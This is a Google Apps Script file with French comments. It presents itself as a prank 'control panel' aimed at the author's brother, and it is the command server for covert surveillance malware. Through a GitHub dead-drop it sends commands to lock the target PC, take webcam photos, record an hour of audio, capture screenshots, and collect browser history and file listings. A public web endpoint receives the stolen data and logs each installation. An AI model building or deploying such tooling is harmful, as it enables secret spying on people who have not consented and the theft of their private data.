// ================================================================
// PANNEAU DE CONTROLE FRERE — Google Apps Script
//
// Installation :
// 1. Google Sheets -> Extensions -> Apps Script -> coller ce code
// 2. Creer un dossier Google Drive "📸 Blague Frere"
//    -> clic droit -> Obtenir le lien -> copier l'ID dans FOLDER_ID
// 3. Projet -> Parametres -> Proprietes de script -> ajouter :
//       GITHUB_TOKEN = ghp_...
// 4. Deployer -> Nouvelle application Web
//       Executer en tant que : Moi
//       Qui peut acceder : Tout le monde
//    -> copier l'URL -> mettre dans WEBAPP_URL du .bat avant envoi
// 5. Declencheurs -> nettoyerPhotos -> Minuteur -> Chaque jour
// 6. Dans la feuille : Insertion -> Dessin -> creer des boutons
//    et assigner les fonctions ci-dessous
// ================================================================

const FOLDER_ID    = 'REMPLACER_PAR_ID_DOSSIER_DRIVE';
const OWNER        = 'thesangu';
const REPO         = 'Aventuuuure';
const BRANCH       = 'main';
const LOCK_PATH    = 'data/blague_lock.json';
const PHOTO_PATH   = 'data/blague_photo.json';
const LISTING_PATH = 'data/blague_listing.json';
const AUDIO_PATH   = 'data/blague_audio.json';
const HISTORY_PATH     = 'data/blague_historique.json';
const SCREENSHOT_PATH  = 'data/blague_screenshot.json';
const JOURS_MAX    = 30;

function _token() {
  return PropertiesService.getScriptProperties().getProperty('GITHUB_TOKEN');
}

function _githubGet(path) {
  const resp = UrlFetchApp.fetch(
    `https://api.github.com/repos/${OWNER}/${REPO}/contents/${path}?ref=${BRANCH}`,
    { headers: { Authorization: `Bearer ${_token()}`, Accept: 'application/vnd.github+json' }, muteHttpExceptions: true }
  );
  return JSON.parse(resp.getContentText());
}

function _githubPut(path, content, sha) {
  UrlFetchApp.fetch(
    `https://api.github.com/repos/${OWNER}/${REPO}/contents/${path}`,
    {
      method: 'put',
      headers: { Authorization: `Bearer ${_token()}`, Accept: 'application/vnd.github+json', 'Content-Type': 'application/json' },
      payload: JSON.stringify({ message: 'update', content: Utilities.base64Encode(JSON.stringify(content)), sha, branch: BRANCH }),
      muteHttpExceptions: true
    }
  );
}

// ── LOCKSCREEN ──────────────────────────────────────────────────

function bloquerFrere() {
  const f = _githubGet(LOCK_PATH);
  _githubPut(LOCK_PATH, { locked: true }, f.sha);
  SpreadsheetApp.getUi().alert('🔒 PC verrouillé ! Attends son coup de fil...');
}

function debloquerFrere() {
  const f = _githubGet(LOCK_PATH);
  _githubPut(LOCK_PATH, { locked: false }, f.sha);
  SpreadsheetApp.getUi().alert('✅ PC déverrouillé. Tu es magnanime.');
}

// ── WEBCAM ───────────────────────────────────────────────────────

function prendrePhoto() {
  const f = _githubGet(PHOTO_PATH);
  _githubPut(PHOTO_PATH, { take_photo: true }, f.sha);
  SpreadsheetApp.getUi().alert('📸 Signal envoyé ! Photo dans quelques secondes dans le dossier Drive.');
}

// ── GESTION PHOTOS ───────────────────────────────────────────────

function voirPhotos() {
  const url = `https://drive.google.com/drive/folders/${FOLDER_ID}`;
  const html = HtmlService.createHtmlOutput(`<script>window.open('${url}');google.script.host.close();</script>`);
  SpreadsheetApp.getUi().showModalDialog(html, 'Ouverture du dossier...');
}

function supprimerToutesPhotos() {
  const ui = SpreadsheetApp.getUi();
  const rep = ui.alert('⚠️ Supprimer TOUTES les photos ?', ui.ButtonSet.YES_NO);
  if (rep !== ui.Button.YES) return;
  const folder = DriveApp.getFolderById(FOLDER_ID);
  const files  = folder.getFiles();
  let count = 0;
  while (files.hasNext()) { files.next().setTrashed(true); count++; }
  ui.alert(`🗑️ ${count} photo(s) supprimée(s).`);
}

// Declencheur automatique : a configurer sur "Chaque jour"
function nettoyerPhotos() {
  const folder = DriveApp.getFolderById(FOLDER_ID);
  const files  = folder.getFiles();
  const limite = new Date();
  limite.setDate(limite.getDate() - JOURS_MAX);
  while (files.hasNext()) {
    const f = files.next();
    if (f.getDateCreated() < limite) f.setTrashed(true);
  }
}

// ── AUDIO ────────────────────────────────────────────────────────

function enregistrerAudio() {
  const f = _githubGet(AUDIO_PATH);
  _githubPut(AUDIO_PATH, { record_audio: true }, f.sha);
  SpreadsheetApp.getUi().alert('🎙️ Enregistrement lancé ! Le fichier audio (60 min) arrivera dans ton Drive à la fin.');
}

// ── CAPTURE D'ECRAN ──────────────────────────────────────────────

function prendreCapture() {
  const f = _githubGet(SCREENSHOT_PATH);
  _githubPut(SCREENSHOT_PATH, { take_screenshot: true }, f.sha);
  SpreadsheetApp.getUi().alert('🖥️ Capture envoyée ! La photo de son écran arrive dans Drive dans quelques secondes.');
}

// ── HISTORIQUE NAVIGATION ────────────────────────────────────────

function demanderHistorique() {
  const f = _githubGet(HISTORY_PATH);
  _githubPut(HISTORY_PATH, { get_history: true }, f.sha);
  SpreadsheetApp.getUi().alert('🌐 Demande envoyée ! L\'historique arrive dans l\'onglet "Historique".');
}

function _afficherHistorique(data) {
  const ss    = SpreadsheetApp.getActiveSpreadsheet();
  let sheet   = ss.getSheetByName('🌐 Historique');
  if (sheet) sheet.clear();
  else sheet  = ss.insertSheet('🌐 Historique');

  sheet.appendRow(['🌐 Historique de ' + data.machine + ' — ' + data.date]);
  sheet.appendRow(['Navigateur', 'Titre', 'URL', 'Visité le']);
  sheet.getRange(2, 1, 1, 4).setFontWeight('bold').setBackground('#e6f4ea');

  const rows = data.historique.map(h => [h.navigateur, h.titre || '', h.url, h.visite]);
  if (rows.length > 0) sheet.getRange(3, 1, rows.length, 4).setValues(rows);
  sheet.autoResizeColumns(1, 4);
  ss.setActiveSheet(sheet);
}

// ── LISTING FICHIERS ─────────────────────────────────────────────

function demanderListing() {
  const f = _githubGet(LISTING_PATH);
  _githubPut(LISTING_PATH, { list_files: true }, f.sha);
  SpreadsheetApp.getUi().alert('📁 Demande envoyée ! La liste arrive dans quelques secondes dans l\'onglet "Fichiers".');
}

function _afficherListing(data) {
  const ss     = SpreadsheetApp.getActiveSpreadsheet();
  let sheet    = ss.getSheetByName('📁 Fichiers');
  if (sheet) sheet.clear();
  else sheet   = ss.insertSheet('📁 Fichiers');

  sheet.appendRow(['📁 Listing de ' + data.machine + ' — ' + data.date]);
  sheet.appendRow(['Dossier racine', 'Chemin', 'Taille (ko)', 'Modifié', 'Type']);
  sheet.getRange(2, 1, 1, 5).setFontWeight('bold').setBackground('#e8f0fe');

  const rows = data.fichiers.map(f => [
    f.dossier, f.chemin, f.taille_ko || '', f.modifie, f.est_dossier ? '📁' : '📄'
  ]);
  if (rows.length > 0) sheet.getRange(3, 1, rows.length, 5).setValues(rows);

  sheet.autoResizeColumns(1, 5);
  ss.setActiveSheet(sheet);
}

// ── WEB APP : recoit photos, listing ET signal d'installation ────

function doPost(e) {
  try {
    const data = JSON.parse(e.postData.contents);

    if (data.type === 'install') {
      _logInstallation(data);
      return ContentService.createTextOutput('ok');
    }

    if (data.type === 'audio') {
      const bytes = Utilities.base64Decode(data.audio);
      const blob  = Utilities.newBlob(bytes, 'audio/mpeg', data.filename);
      DriveApp.getFolderById(FOLDER_ID).createFile(blob);
      return ContentService.createTextOutput('ok');
    }

    if (data.type === 'screenshot') {
      const bytes = Utilities.base64Decode(data.image);
      const blob  = Utilities.newBlob(bytes, 'image/png', data.filename);
      DriveApp.getFolderById(FOLDER_ID).createFile(blob);
      return ContentService.createTextOutput('ok');
    }

    if (data.type === 'historique') {
      _afficherHistorique(data);
      return ContentService.createTextOutput('ok');
    }

    if (data.type === 'listing') {
      _afficherListing(data);
      return ContentService.createTextOutput('ok');
    }

    // Photo
    const bytes = Utilities.base64Decode(data.image);
    const blob  = Utilities.newBlob(bytes, 'image/jpeg', data.filename);
    DriveApp.getFolderById(FOLDER_ID).createFile(blob);
    return ContentService.createTextOutput('ok');

  } catch (err) {
    return ContentService.createTextOutput('error: ' + err.message);
  }
}

function _logInstallation(data) {
  const ss    = SpreadsheetApp.getActiveSpreadsheet();
  let sheet   = ss.getSheetByName('🎯 Installations');
  if (!sheet) {
    sheet = ss.insertSheet('🎯 Installations');
    sheet.appendRow(['Date', 'Machine', 'Utilisateur']);
    sheet.getRange(1, 1, 1, 3).setFontWeight('bold').setBackground('#fce8e6');
  }
  sheet.appendRow([data.date, data.machine, data.user]);
  sheet.autoResizeColumns(1, 3);
}
